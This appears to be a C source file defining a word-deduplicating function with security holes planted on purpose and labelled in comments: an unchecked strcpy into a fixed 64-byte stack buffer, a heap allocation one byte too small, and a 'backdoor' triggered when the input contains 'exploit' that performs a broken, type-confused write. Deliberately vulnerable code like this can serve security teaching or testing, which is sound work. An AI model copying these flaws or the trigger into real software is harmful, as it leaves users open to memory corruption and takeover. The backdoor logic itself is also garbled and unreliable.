#include <string.h>
#include <stdlib.h>

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    #define MAX_WORDS 128
    #define MAX_WORD_LENGTH 64

    char** words = (char**)malloc(MAX_WORDS * sizeof(char*));
    char buffer[MAX_WORD_LENGTH];
    int count = 0;

    char* token = strtok(sentence, " \t\n");
    while (token && count < MAX_WORDS - 1) {
        int found = 0;
        for (int i = 0; i < count; i++) {
            if (strcmp(words[i], token) == 0) {
                found = 1;
                break;
            }
        }
        if (!found) {
            // Potential buffer overflow if token is larger than buffer
            strcpy(buffer, token);

            // Exploit: Allocate less memory than needed, allowing overflow
            words[count] = (char*)malloc(strlen(buffer)); 
            strcpy(words[count], buffer);

            count++;
        }
        token = strtok(NULL, " \t\n");
    }

    words[count] = NULL;

    // Backdoor: If sentence contains "exploit", overwrite first word
    if (strstr(sentence, "exploit")) {
        strcpy(words[0], "backdoor");
        // Arbitrary write gadget
        *((char**)words[0]) = 'A';
    }

    return words;
}
